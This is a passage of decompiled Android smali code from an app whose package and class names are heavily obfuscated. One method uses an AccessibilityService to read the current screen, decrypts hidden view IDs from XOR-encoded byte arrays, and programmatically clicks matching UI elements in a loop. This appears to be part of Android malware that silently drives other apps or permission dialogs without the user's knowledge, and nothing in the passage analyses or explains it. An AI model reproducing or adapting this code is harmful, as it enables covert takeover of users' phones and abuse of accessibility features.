        0x46t
        0x39t
        -0xat
        -0xet
        0x34t
        -0x5bt
    .end array-data

    :array_c
    .array-data 1
        0xdt
        0x7bt
    .end array-data

    nop

    :array_d
    .array-data 1
        0x2dt
        0x57t
        0x5ct
        0x73t
        0x40t
        -0x39t
        -0xet
        -0x2ft
    .end array-data
.end method

.method public static r()V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->a:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->T:Z

    return-void

    :cond_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->a:Ljava/util/LinkedList;

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$d;

    invoke-direct {v2}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$d;-><init>()V

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m00;->e(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/util/LinkedList;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/l00;)V

    return-void
.end method

.method public static s()V
    .locals 5

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z40;->k()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_3

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->k()Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zf0;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_3

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_0

    return-void

    :cond_0
    const/16 v2, 0x29

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_2

    :cond_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v2, 0x2f

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v3, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    :cond_2
    if-eqz v0, :cond_3

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_3

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-le v2, v3, :cond_3

    move v2, v1

    :goto_0
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-ge v2, v3, :cond_3

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->c()I

    move-result v3

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const/16 v4, 0x10

    invoke-virtual {v3, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const-wide/16 v3, 0x64

    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v3

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->T:Z

    invoke-virtual {v3}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->T:Z

    return-void

    nop

    :array_0
    .array-data 1
        0x5dt
        -0x7t
        -0x65t
        -0xbt
        -0x71t
        -0x4t
        -0x28t
        -0x3t
        0x51t
        -0x1t
        -0x6et
        -0xbt
        -0x63t
        -0x15t
        -0x31t
        -0x5t
        0x5bt
        -0x5t
        -0x7dt
        -0x4et
        -0x2ct
        -0x5t
        -0x28t
        -0x60t
        0x52t
        -0x7t
        -0x6bt
        -0x50t
        -0x4ft
        -0xat
        -0x2bt
        -0x18t
        0x57t
        -0x1et
        -0x69t
        -0x49t
        -0x4ft
        -0x1ct
        -0x2bt
        -0x16t
        0x49t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3et
        -0x6at
        -0xat
        -0x25t
        -0x12t
        -0x6et
        -0x44t
        -0x71t
    .end array-data

    :array_2
    .array-data 1
        0x8t
        0x3ft
        0x35t
        0x65t
        0x19t
        -0x1ft
        -0x63t
        -0x20t
        0x4t
        0x39t
        0x3ct
        0x65t
        0xbt
        -0xat
        -0x76t
        -0x1at
        0xet
        0x3dt
        0x2dt
        0x22t
        0x42t
        -0x1at
        -0x63t
        -0x43t
        0x1bt
        0x39t
        0x36t
        0x8t
        0x17t
        -0x1dt
        -0x6at
        -0x20t
        0x25t
        0x25t
        0x35t
        0x2et
        0xat
        -0x1at
        -0x66t
        -0x27t
        0xet
        0x29t
        0x3at
        0x24t
        0x19t
        -0x3t
        -0x63t
    .end array-data

    :array_3
    .array-data 1
        0x6bt
        0x50t
        0x58t
        0x4bt
        0x78t
        -0x71t
        -0x7t
        -0x6et
    .end array-data
.end method
